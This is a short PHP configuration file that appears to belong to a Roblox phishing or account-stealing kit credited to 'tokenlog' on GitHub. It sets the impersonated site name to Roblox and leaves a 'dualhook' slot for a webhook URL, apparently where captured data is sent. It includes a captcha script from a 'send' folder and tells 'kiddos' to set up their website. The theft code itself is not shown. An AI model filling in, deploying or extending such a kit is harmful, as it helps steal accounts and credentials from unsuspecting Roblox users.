<?php
include("../../send/captcha.php");
$siteName = "Roblox";
$webText = htmlspecialchars("");
$dualhook = "PLEASE ENTER YOUR WEBHOOK HERE, ALSO THIS IS MADE BY tokenlog ON GITHUB. I DO NOT WANT TO CALL YOU A SKID.";
$mainpfp = "Profile Picture";
$embedColor = "386acf";
$discord = "https://discord.gg/";
?>

# setup your website here kiddos
